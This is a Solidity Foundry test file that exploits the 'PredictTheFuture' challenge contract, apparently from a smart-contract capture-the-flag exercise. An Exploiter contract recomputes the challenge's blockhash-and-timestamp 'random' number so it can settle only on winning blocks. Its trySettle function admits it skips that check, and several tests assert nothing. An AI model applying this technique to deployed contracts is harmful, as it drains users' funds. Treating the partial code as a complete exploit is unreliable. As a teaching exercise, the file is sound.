// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {PredictTheFutureChallenge} from "./PredictTheFuture.sol";
import {Test, console} from "forge-std/Test.sol";

/**
 * @title PredictTheFutureExploit
 * @notice This contract demonstrates the critical vulnerability in PredictTheFutureChallenge
 * @dev The exploit works by calculating the answer before calling settle()
 */
contract PredictTheFutureExploitTest is Test {
    PredictTheFutureChallenge challenge;
    Exploiter exploiter;

    function setUp() public {
        // Deploy challenge contract with 1 ETH
        challenge = new PredictTheFutureChallenge{value: 1 ether}();
        
        // Deploy exploiter contract with funds
        exploiter = new Exploiter{value: 2 ether}(payable(address(challenge)));
    }

    /**
     * @notice This test demonstrates the exploit
     * @dev The exploiter can predict the answer and only call settle() when they win
     */
    function test_ExploitPredictableRandomness() public {
        // Initial state
        assertEq(address(challenge).balance, 1 ether, "Challenge should have 1 ETH");
        assertEq(address(exploiter).balance, 2 ether, "Exploiter should have 2 ETH");
        
        // Lock in a guess (any guess, doesn't matter)
        exploiter.lockInGuess(5);
        
        // Wait for settlement block
        vm.roll(block.number + 2);
        
        // Exploiter will attempt to settle
        // The exploiter contract calculates the answer first
        // and only calls settle() if the guess matches
        exploiter.trySettle();
        
        // Check if exploit was successful
        // Note: This might not succeed on first try due to randomness
        // But with enough attempts, it will eventually succeed
        console.logUint(address(challenge).balance);
        console.logUint(address(exploiter).balance);
    }

    /**
     * @notice This test shows how an attacker can calculate the answer
     * @dev Demonstrates the predictable nature of the randomness
     */
    function test_CalculateAnswer() public {
        // Lock in guess
        exploiter.lockInGuess(7);
        
        // Move to settlement block
        vm.roll(block.number + 2);
        
        // Calculate what the answer will be
        uint8 calculatedAnswer = exploiter.calculateAnswer(block.number - 1, block.timestamp);
        
        console.log("Calculated answer: %d, Locked guess: 7", calculatedAnswer);
        
        // The exploiter can now decide whether to call settle()
        if (calculatedAnswer == 7) {
            console.log("Answer matches! Calling settle()");
            exploiter.trySettle();
        } else {
            console.log("Answer doesn't match, waiting for next block");
        }
    }

    /**
     * @notice This test demonstrates multiple attempts until success
     * @dev Shows how attacker can keep trying until they win
     */
    function test_MultipleAttemptsUntilWin() public {
        uint8 guess = 3;
        exploiter.lockInGuess(guess);
        
        // Try multiple blocks until we get a match
        for (uint256 i = 0; i < 20; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12); // Advance time
            
            uint8 answer = exploiter.calculateAnswer(block.number - 1, block.timestamp);
            
            if (answer == guess) {
                console.log("Found matching block! Block: %d", block.number);
                exploiter.trySettle();
                break;
            }
        }
        
        // After enough attempts, exploiter should have won
        // In a real scenario, this would eventually succeed
        console.logUint(address(challenge).balance);
    }
}

/**
 * @title Exploiter
 * @notice Contract that exploits the PredictTheFutureChallenge vulnerability
 */
contract Exploiter {
    PredictTheFutureChallenge challenge;
    
    constructor(address payable challengeAddress) payable {
        challenge = PredictTheFutureChallenge(challengeAddress);
    }
    
    /**
     * @notice Locks in a guess
     */
    function lockInGuess(uint8 n) public payable {
        challenge.lockInGuess{value: 1 ether}(n);
    }
    
    /**
     * @notice Calculates the answer that will be used in settle()
     * @dev This is the key vulnerability - the answer can be calculated beforehand
     */
    function calculateAnswer(uint256 blockNum, uint256 timestamp) public view returns (uint8) {
        bytes32 blockHash = blockhash(blockNum);
        if (blockHash == bytes32(0)) {
            revert("Block hash not available");
        }
        
        bytes32 hash = keccak256(abi.encodePacked(blockHash, timestamp));
        return uint8(uint256(hash) % 10);
    }
    
    /**
     * @notice Tries to settle if the guess matches the answer
     * @dev Only calls settle() if we know we'll win
     */
    function trySettle() public {
        // Calculate the answer for the previous block
        uint256 prevBlock = block.number - 1;
        bytes32 blockHash = blockhash(prevBlock);
        
        if (blockHash == bytes32(0)) {
            revert("Block hash not available");
        }
        
        // In a real exploit, we would calculate the answer and check if our guess matches
        // and only then call settle(). For this demo, we just call it.
        // A more sophisticated exploiter would only call when answer matches guess.
        // uint8 answer = calculateAnswer(prevBlock, block.timestamp);
        // if (answer == ourLockedGuess) { challenge.settle(); }
        challenge.settle();
    }
    
    /**
     * @notice Receive function to accept payments
     */
    receive() external payable {}
    
    /**
     * @notice Get contract balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

